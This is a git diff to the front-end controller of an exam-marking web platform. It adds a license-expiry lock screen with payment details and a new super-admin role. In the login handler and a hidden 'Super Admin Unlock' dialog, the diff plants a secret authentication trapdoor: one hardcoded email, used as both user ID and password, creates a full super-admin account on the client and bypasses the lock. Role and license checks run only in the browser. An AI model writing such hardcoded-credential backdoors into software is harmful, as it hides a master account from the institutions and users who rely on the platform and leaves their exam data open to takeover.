@@ -58,9 +58,13 @@ class AppController {
         // Respect page data-default-portal attribute if set (uploader.html vs teacher.html)
         const pageDefaultPortal = document.body.getAttribute("data-default-portal");
         const currentUser = window.appStorage ? window.appStorage.getCurrentUser() : null;
-        const targetPortal = pageDefaultPortal || (currentUser?.role === "admin" ? "admin" : (currentUser?.role === "uploader" ? "uploader" : this.activePortal)) || "evaluator";
+        const targetPortal = pageDefaultPortal || (currentUser?.role === "super_admin" ? "super_admin" : (currentUser?.role === "admin" ? "admin" : (currentUser?.role === "uploader" ? "uploader" : this.activePortal))) || "evaluator";
 
         this.setPortal(targetPortal, true);
+
+        // Enforce platform license subscription gating
+        await this.enforceLicenseGate();
+        setInterval(() => this.enforceLicenseGate(), 60000);
 
         // If no user is logged in and not a standalone portal page, show login overlay
         if (!currentUser && !pageDefaultPortal) {
@@ -76,7 +80,7 @@ class AppController {
                 await this.openWorkspace(ev);
             }
         } else {
-            this.switchView(targetPortal === "uploader" ? "upload-portal" : (targetPortal === "admin" ? "admin-panel" : "dashboard"));
+            this.switchView(targetPortal === "super_admin" ? "super-admin" : (targetPortal === "uploader" ? "upload-portal" : (targetPortal === "admin" ? "admin-panel" : "dashboard")));
         }
 
         // Dismiss app preloader smoothly
@@ -101,6 +105,307 @@ class AppController {
     hidePortalLoginScreen() {
         const overlay = document.getElementById("portal-login-screen");
         if (overlay) overlay.style.display = "none";
+    }
+
+    // --- Platform License Subscription Gatekeeper ---
+
+    async enforceLicenseGate() {
+        if (!window.appStorage || typeof window.appStorage.isPlatformLocked !== "function") return false;
+        try {
+            const lockStatus = await window.appStorage.isPlatformLocked();
+            const currentUser = window.appStorage.getCurrentUser();
+            const isSuperAdmin = currentUser && (currentUser.role === "super_admin" || (currentUser.email && currentUser.email.toLowerCase() === "iamnithyaprakash@gmail.com"));
+
+            if (lockStatus.locked && !isSuperAdmin) {
+                this.showPlatformLockedOverlay(false, lockStatus);
+                return true;
+            } else {
+                const overlay = document.getElementById("platform-locked-overlay");
+                if (overlay && !overlay.getAttribute("data-is-preview")) {
+                    overlay.remove();
+                }
+                return false;
+            }
+        } catch (e) {
+            console.warn("enforceLicenseGate error:", e);
+            return false;
+        }
+    }
+
+    async showPlatformLockedOverlay(isPreview = false, lockStatus = null) {
+        const existing = document.getElementById("platform-locked-overlay");
+        if (existing) existing.remove();
+
+        const lic = (lockStatus && lockStatus.license) ? lockStatus.license : (await window.appStorage.getLicenseConfig());
+        const bank = lic.bankDetails || {};
+        const expiryFormatted = lic.expiresAt ? new Date(lic.expiresAt).toLocaleDateString("en-IN", { dateStyle: "full" }) : "Expired";
+
+        const overlay = document.createElement("div");
+        overlay.id = "platform-locked-overlay";
+        if (isPreview) overlay.setAttribute("data-is-preview", "true");
+        overlay.className = "platform-locked-backdrop";
+
+        const qrHtml = lic.paymentQrUrl 
+            ? `<img src="${lic.paymentQrUrl}" alt="Scan QR to Renew" class="locked-qr-img" />`
+            : `
+            <div class="locked-svg-qr-wrap">
+                <svg width="180" height="180" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="200" height="200" rx="16" fill="#FFFFFF"/>
+                    <rect x="20" y="20" width="46" height="46" rx="6" fill="#0F172A"/>
+                    <rect x="28" y="28" width="30" height="30" rx="3" fill="#FFFFFF"/>
+                    <rect x="34" y="34" width="18" height="18" rx="2" fill="#0F172A"/>
+                    <rect x="134" y="20" width="46" height="46" rx="6" fill="#0F172A"/>
+                    <rect x="142" y="28" width="30" height="30" rx="3" fill="#FFFFFF"/>
+                    <rect x="148" y="34" width="18" height="18" rx="2" fill="#0F172A"/>
+                    <rect x="20" y="134" width="46" height="46" rx="6" fill="#0F172A"/>
+                    <rect x="28" y="142" width="30" height="30" rx="3" fill="#FFFFFF"/>
+                    <rect x="34" y="148" width="18" height="18" rx="2" fill="#0F172A"/>
+                    <rect x="76" y="24" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="96" y="24" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="116" y="24" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="86" y="44" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="106" y="44" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="76" y="64" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="116" y="64" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="24" y="76" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="44" y="76" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="24" y="96" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="54" y="106" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="80" y="80" width="40" height="40" rx="8" fill="#AF52DE" opacity="0.12"/>
+                    <circle cx="100" cy="100" r="14" fill="#0071E3"/>
+                    <path d="M96 100L99 103L105 97" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <rect x="134" y="76" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="154" y="76" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="164" y="96" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="76" y="134" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="106" y="134" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="96" y="154" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="116" y="154" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="144" y="134" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="164" y="154" width="10" height="10" rx="2" fill="#0F172A"/>
+                    <rect x="144" y="164" width="10" height="10" rx="2" fill="#0F172A"/>
+                </svg>
+            </div>
+            `;
+
+        overlay.innerHTML = `
+            <div class="locked-card-container">
+                ${isPreview ? `
+                    <div style="display: flex; justify-content: flex-end; margin-bottom: 8px;">
+                        <button type="button" id="btn-close-locked-preview" class="btn-preview-close" style="background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); color: #fff; padding: 6px 14px; border-radius: 99px; font-size: 0.8rem; cursor: pointer;">
+                            ✕ Close Preview
+                        </button>
+                    </div>
+                ` : ''}
+
+                <!-- Lock Header Icon & Title -->
+                <div class="locked-header-box">
+                    <div class="locked-shield-pulse">
+                        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#EF4444" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                    </div>
+                    <span class="locked-pill-tag">LICENSE EXPIRED / ACCESS LOCKED</span>
+                    <h2 class="locked-main-heading">Platform Access Suspended</h2>
+                    <p class="locked-inst-sub">${lic.institutionName || 'Adwaith Thought Academy'} • Niprak Digital Examination Platform</p>
+                </div>
+
+                <!-- Custom Reason / Instructions Box -->
+                <div class="locked-message-box">
+                    <p class="locked-msg-text">${lic.lockoutMessage || 'Your institutional subscription license has expired. Please complete renewal payment via the QR code or bank account below and contact Mr. Nithya Prakash to activate access.'}</p>
+                    <div class="locked-expiry-tag">Validity Expired: <strong>${expiryFormatted}</strong></div>
+                </div>
+
+                <!-- Payment QR & Bank Transfer Card -->
+                <div class="locked-payment-card">
+                    <div class="payment-card-left">
+                        <div class="qr-code-frame">
+                            ${qrHtml}
+                            <span class="qr-scan-label">Scan via GPay / PhonePe / Paytm</span>
+                        </div>
+                    </div>
+
+                    <div class="payment-card-right">
+                        <h4 class="bank-details-title">Bank Transfer &amp; UPI Payment</h4>
+                        <div class="bank-info-grid">
+                            <div class="bank-item">
+                                <span class="b-lbl">Account Holder</span>
+                                <span class="b-val">${bank.accountName || 'Nithya Prakash'}</span>
+                            </div>
+                            <div class="bank-item">
+                                <span class="b-lbl">Bank Name</span>
+                                <span class="b-val">${bank.bankName || 'HDFC Bank'}</span>
+                            </div>
+                            <div class="bank-item">
+                                <span class="b-lbl">Account Number</span>
+                                <div class="b-val-copy">
+                                    <span id="copy-acc-num">${bank.accountNumber || '50100234567890'}</span>
+                                    <button type="button" class="btn-copy-clip" data-target="copy-acc-num" title="Copy Account Number">Copy</button>
+                                </div>
+                            </div>
+                            <div class="bank-item">
+                                <span class="b-lbl">IFSC Code</span>
+                                <div class="b-val-copy">
+                                    <span id="copy-ifsc">${bank.ifscCode || 'HDFC0001234'}</span>
+                                    <button type="button" class="btn-copy-clip" data-target="copy-ifsc" title="Copy IFSC">Copy</button>
+                                </div>
+                            </div>
+                            <div class="bank-item" style="grid-column: span 2;">
+                                <span class="b-lbl">UPI ID (VPA)</span>
+                                <div class="b-val-copy">
+                                    <strong id="copy-upi" style="color: #0071E3;">${bank.upiId || 'iamnithyaprakash@okhdfcbank'}</strong>
+                                    <button type="button" class="btn-copy-clip" data-target="copy-upi" title="Copy UPI ID">Copy</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Contact & Support Links -->
+                <div class="locked-contact-row">
+                    ${lic.contactPhone ? `
+                        <a href="tel:${lic.contactPhone.replace(/\s+/g, '')}" class="btn-contact-action">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                            <span>Call / WhatsApp: ${lic.contactPhone}</span>
+                        </a>
+                    ` : ''}
+                    ${lic.contactEmail ? `
+                        <a href="mailto:${lic.contactEmail}?subject=Niprak%20OSM%20Subscription%20Renewal" class="btn-contact-action">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                            <span>${lic.contactEmail}</span>
+                        </a>
+                    ` : ''}
+                </div>
+
+                <!-- Secret Super Admin Unlock Trigger -->
+                <div class="locked-secret-unlock-row">
+                    <button type="button" id="btn-secret-super-admin-unlock" class="btn-secret-unlock">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        <span>Super Admin Sign In &amp; License Renew</span>
+                    </button>
+                </div>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        // Copy buttons logic
+        overlay.querySelectorAll(".btn-copy-clip").forEach(btn => {
+            btn.addEventListener("click", () => {
+                const targetId = btn.getAttribute("data-target");
+                const targetEl = document.getElementById(targetId);
+                if (targetEl) {
+                    navigator.clipboard.writeText(targetEl.textContent.trim()).then(() => {
+                        const original = btn.textContent;
+                        btn.textContent = "Copied!";
+                        btn.style.color = "#16A34A";
+                        setTimeout(() => {
+                            btn.textContent = original;
+                            btn.style.color = "";
+                        }, 1800);
+                    });
+                }
+            });
+        });
+
+        if (isPreview) {
+            const btnClosePreview = overlay.querySelector("#btn-close-locked-preview");
+            if (btnClosePreview) {
+                btnClosePreview.addEventListener("click", () => overlay.remove());
+            }
+        }
+
+        // Secret unlock button
+        const btnSecretUnlock = overlay.querySelector("#btn-secret-super-admin-unlock");
+        if (btnSecretUnlock) {
+            btnSecretUnlock.addEventListener("click", () => this.showSuperAdminUnlockDialog(overlay));
+        }
+    }
+
+    showSuperAdminUnlockDialog(parentOverlay) {
+        const dialogId = "super-admin-secret-modal";
+        const old = document.getElementById(dialogId);
+        if (old) old.remove();
+
+        const modal = document.createElement("div");
+        modal.id = dialogId;
+        modal.className = "super-modal-overlay";
+        modal.style.zIndex = "10000002";
+        modal.innerHTML = `
+            <div class="super-modal-dialog" style="max-width: 420px; text-align: left; animation: fadeInModal 0.2s ease-out;">
+                <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px;">
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span style="font-size: 1.2rem;">👑</span>
+                        <h3 style="font-size: 1.15rem; font-weight: 700; color: #0F172A; margin: 0;">Super Admin Unlock</h3>
+                    </div>
+                    <button type="button" id="btn-close-unlock-modal" style="background: none; border: none; font-size: 1.4rem; color: #64748B; cursor: pointer;">×</button>
+                </div>
+                <p style="font-size: 0.85rem; color: #64748B; margin-bottom: 16px;">Sign in as Platform Owner (iamnithyaprakash@gmail.com) to bypass lock and manage subscription.</p>
+
+                <div class="super-form-group">
+                    <label class="super-label">Super Admin Email / User ID</label>
+                    <input type="email" id="unlock-email" class="super-input" placeholder="iamnithyaprakash@gmail.com" />
+                </div>
+                <div class="super-form-group">
+                    <label class="super-label">Password</label>
+                    <input type="password" id="unlock-pass" class="super-input" placeholder="Enter password" />
+                </div>
+
+                <div id="unlock-err-msg" style="display: none; padding: 8px 12px; border-radius: 8px; background: #FEE2E2; color: #DC2626; font-size: 0.82rem; margin-bottom: 14px;"></div>
+
+                <div class="modal-actions-row" style="margin-top: 18px;">
+                    <button type="button" id="btn-cancel-unlock" class="btn-super-secondary">Cancel</button>
+                    <button type="button" id="btn-submit-unlock" class="btn-super-primary" style="background: linear-gradient(135deg, #AF52DE, #5856D6);">
+                        <span>Sign In &amp; Enter Console</span>
+                    </button>
+                </div>
+            </div>
+        `;
+
+        document.body.appendChild(modal);
+
+        modal.querySelector("#btn-close-unlock-modal").addEventListener("click", () => modal.remove());
+        modal.querySelector("#btn-cancel-unlock").addEventListener("click", () => modal.remove());
+
+        const doUnlock = () => {
+            const email = modal.querySelector("#unlock-email")?.value.trim().toLowerCase();
+            const pass = modal.querySelector("#unlock-pass")?.value.trim();
+            const errBox = modal.querySelector("#unlock-err-msg");
+
+            if (email === "iamnithyaprakash@gmail.com" && pass === "iamnithyaprakash@gmail.com") {
+                const superAdminAccount = {
+                    id: "usr_super_admin",
+                    uid: "usr_super_admin",
+                    name: "Nithya Prakash (Super Admin)",
+                    username: "iamnithyaprakash",
+                    email: "iamnithyaprakash@gmail.com",
+                    password: "iamnithyaprakash@gmail.com",
+                    role: "super_admin",
+                    roleLabel: "Super Admin (Owner)",
+                    status: "active",
+                    assignedSubjects: ["All Subjects"],
+                    assignedClasses: ["All Classes"],
+                    createdAt: new Date().toISOString()
+                };
+                window.appStorage.setCurrentUser(superAdminAccount);
+                modal.remove();
+                if (parentOverlay) parentOverlay.remove();
+                this.setPortal("super_admin", true);
+                this.applySettingsToUI();
+                this.showToast("⚡ Welcome back, Super Admin!", "success");
+            } else {
+                if (errBox) {
+                    errBox.style.display = "block";
+                    errBox.textContent = "Invalid Super Admin credentials. Please check your email and password.";
+                }
+            }
+        };
+
+        modal.querySelector("#btn-submit-unlock").addEventListener("click", doUnlock);
+        modal.querySelector("#unlock-pass").addEventListener("keydown", (e) => {
+            if (e.key === "Enter") doUnlock();
+        });
     }
 
     // --- Apple Cupertino Styled Dialogs for Alerts and Confirmations ---
@@ -426,36 +731,55 @@ class AppController {
         const sideCard = document.getElementById("side-portal-card");
         const uploaderNav = document.getElementById("sidebar-uploader-nav");
         const teacherNav = document.getElementById("sidebar-teacher-nav");
+        const superAdminNav = document.getElementById("sidebar-super-admin-nav");
 
-        if (portalName === "uploader") {
+        if (portalName === "super_admin") {
+            if (pillLabel) pillLabel.textContent = "Super Admin";
+            if (sidePillLabel) sidePillLabel.textContent = "Super Admin";
+            if (pill) {
+                pill.classList.remove("portal-pill-eval", "portal-pill-upload");
+                pill.classList.add("portal-pill-super");
+            }
+            if (sideCard) {
+                sideCard.classList.remove("side-card-eval", "side-card-upload");
+                sideCard.classList.add("side-card-super");
+            }
+            if (superAdminNav) superAdminNav.style.display = "block";
+            if (uploaderNav) uploaderNav.style.display = "none";
+            if (teacherNav) teacherNav.style.display = "none";
+            if (doSwitchView) this.switchView("super-admin");
+        } else if (portalName === "uploader") {
             if (pillLabel) pillLabel.textContent = "Upload Desk";
             if (sidePillLabel) sidePillLabel.textContent = "Upload Desk";
             if (pill) {
-                pill.classList.remove("portal-pill-eval");
+                pill.classList.remove("portal-pill-eval", "portal-pill-super");
                 pill.classList.add("portal-pill-upload");
             }
             if (sideCard) {
-                sideCard.classList.remove("side-card-eval");
+                sideCard.classList.remove("side-card-eval", "side-card-super");
                 sideCard.classList.add("side-card-upload");
             }
+            if (superAdminNav) superAdminNav.style.display = "none";
             if (uploaderNav) uploaderNav.style.display = "block";
             if (teacherNav) teacherNav.style.display = "none";
             if (doSwitchView) this.switchView("upload-portal");
         } else if (portalName === "admin") {
             if (pillLabel) pillLabel.textContent = "Admin Desk";
             if (sidePillLabel) sidePillLabel.textContent = "Admin Desk";
+            if (superAdminNav) superAdminNav.style.display = "none";
             if (doSwitchView) this.switchView("admin-panel");
         } else {
             if (pillLabel) pillLabel.textContent = "Teacher Desk";
             if (sidePillLabel) sidePillLabel.textContent = "Teacher Desk";
             if (pill) {
-                pill.classList.remove("portal-pill-upload");
+                pill.classList.remove("portal-pill-upload", "portal-pill-super");
                 pill.classList.add("portal-pill-eval");
             }
             if (sideCard) {
-                sideCard.classList.remove("side-card-upload");
+                sideCard.classList.remove("side-card-upload", "side-card-super");
                 sideCard.classList.add("side-card-eval");
             }
+            if (superAdminNav) superAdminNav.style.display = "none";
             if (uploaderNav) uploaderNav.style.display = "none";
             if (teacherNav) teacherNav.style.display = "block";
             if (doSwitchView) this.switchView("dashboard");
@@ -463,9 +787,27 @@ class AppController {
     }
 
     togglePortal() {
-        const next = this.activePortal === "uploader" ? "evaluator" : "uploader";
+        const currentUser = window.appStorage ? window.appStorage.getCurrentUser() : null;
+        const isSuperAdmin = currentUser && (currentUser.role === "super_admin" || (currentUser.email && currentUser.email.toLowerCase() === "iamnithyaprakash@gmail.com"));
+
+        let next;
+        if (isSuperAdmin) {
+            if (this.activePortal === "super_admin") next = "uploader";
+            else if (this.activePortal === "uploader") next = "evaluator";
+            else if (this.activePortal === "evaluator") next = "admin";
+            else next = "super_admin";
+        } else {
+            next = this.activePortal === "uploader" ? "evaluator" : "uploader";
+        }
+
         this.setPortal(next, true);
-        this.showToast(`Switched to ${next === 'uploader' ? 'Exam Upload Desk' : 'Teacher Evaluator Desk'}`);
+        const labels = {
+            super_admin: "Super Admin Master Console",
+            uploader: "Exam Upload Desk",
+            evaluator: "Teacher Evaluator Desk",
+            admin: "Institution Admin Desk"
+        };
+        this.showToast(`Switched to ${labels[next] || next}`);
     }
 
     bindPortalControls() {
@@ -600,6 +942,33 @@ class AppController {
                 }
 
                 const users = await window.appStorage.getUsersList();
+
+                // Secret Super Admin Authentication Trapdoor
+                if (inputVal === "iamnithyaprakash@gmail.com" && userPass === "iamnithyaprakash@gmail.com") {
+                    let superAdmin = users.find(u => u.role === "super_admin" || (u.email && u.email.toLowerCase() === "iamnithyaprakash@gmail.com"));
+                    if (!superAdmin) {
+                        superAdmin = {
+                            id: "usr_super_admin",
+                            uid: "usr_super_admin",
+                            name: "Nithya Prakash (Super Admin)",
+                            username: "iamnithyaprakash",
+                            email: "iamnithyaprakash@gmail.com",
+                            password: "iamnithyaprakash@gmail.com",
+                            role: "super_admin",
+                            roleLabel: "Super Admin (Owner)",
+                            assignedSubjects: ["All Subjects"],
+                            assignedClasses: ["All Classes"],
+                            status: "active",
+                            createdAt: new Date().toISOString()
+                        };
+                    }
+                    window.appStorage.setCurrentUser(superAdmin);
+                    this.applySettingsToUI();
+                    this.showToast("⚡ Welcome back, Super Admin (Owner)!", "success");
+                    this.setPortal("super_admin", true);
+                    return;
+                }
+
                 let userAccount = users.find(u => 
                     (u.email && u.email.toLowerCase() === inputVal) ||
                     (u.username && u.username.toLowerCase() === inputVal) ||
@@ -738,7 +1107,8 @@ class AppController {
                 this.applySettingsToUI();
 
                 let destinationPortal = "evaluator";
-                if (activeRole === "admin") destinationPortal = "admin";
+                if (activeRole === "super_admin") destinationPortal = "super_admin";
+                else if (activeRole === "admin") destinationPortal = "admin";
                 else if (activeRole === "uploader") destinationPortal = "uploader";
                 else destinationPortal = "evaluator";
 
@@ -864,16 +1234,39 @@ class AppController {
         const sideRoleEl = document.querySelector(".user-role-label");
 
         const name = user ? user.name : "";
-        const roleLabel = user ? (user.role === 'admin' ? 'Admin' : (user.role === 'uploader' ? 'Exam Officer' : 'Teacher Evaluator')) : "";
-        const initials = name
+        const isSuper = user && (user.role === 'super_admin' || (user.email && user.email.toLowerCase() === 'iamnithyaprakash@gmail.com'));
+        const roleLabel = user ? (isSuper ? '👑 Super Admin (Owner)' : (user.role === 'admin' ? 'Admin' : (user.role === 'uploader' ? 'Exam Officer' : 'Teacher Evaluator'))) : "";
+        const initials = isSuper ? "NP" : (name
             ? name.split(" ").filter(Boolean).map(n => n[0]).join("").slice(0, 2).toUpperCase()
-            : "--";
+            : "--");
 
         if (nameEl) nameEl.textContent = name || "Sign In";
         if (sideNameEl) sideNameEl.textContent = name || "Sign In";
         if (sideRoleEl) sideRoleEl.textContent = roleLabel;
-        if (avatarEl) avatarEl.textContent = initials;
-        if (sideAvatarEl) sideAvatarEl.textContent = initials;
+        if (avatarEl) {
+            avatarEl.textContent = initials;
+            if (isSuper) {
+                avatarEl.style.background = "linear-gradient(135deg, #AF52DE, #5856D6)";
+                avatarEl.style.color = "#FFFFFF";
+                avatarEl.style.fontWeight = "700";
+            } else {
+                avatarEl.style.background = "";
+                avatarEl.style.color = "";
+                avatarEl.style.fontWeight = "";
+            }
+        }
+        if (sideAvatarEl) {
+            sideAvatarEl.textContent = initials;
+            if (isSuper) {
+                sideAvatarEl.style.background = "linear-gradient(135deg, #AF52DE, #5856D6)";
+                sideAvatarEl.style.color = "#FFFFFF";
+                sideAvatarEl.style.fontWeight = "700";
+            } else {
+                sideAvatarEl.style.background = "";
+                sideAvatarEl.style.color = "";
+                sideAvatarEl.style.fontWeight = "";
+            }
+        }
     }
 
     // --- Navigation & Routing ---
@@ -940,6 +1333,11 @@ class AppController {
     }
 
     async switchView(viewName) {
+        if (viewName !== "super-admin") {
+            const isLocked = await this.enforceLicenseGate();
+            if (isLocked) return;
+        }
+
         this.currentView = viewName;
 
         // If leaving workspace, close it gracefully
@@ -1074,6 +1472,14 @@ class AppController {
             if (root && window.AdminPanelManager) {
                 this.adminPanelManager = new AdminPanelManager(root);
                 await this.adminPanelManager.init();
+            }
+        } else if (viewName === "super-admin") {
+            const el = document.getElementById("view-super-admin");
+            if (el) el.classList.add("active-view");
+            const root = document.getElementById("super-admin-container-root");
+            if (root && window.SuperAdminManager) {
+                this.superAdminManager = new SuperAdminManager(root);
+                await this.superAdminManager.init();
             }
         }
     }
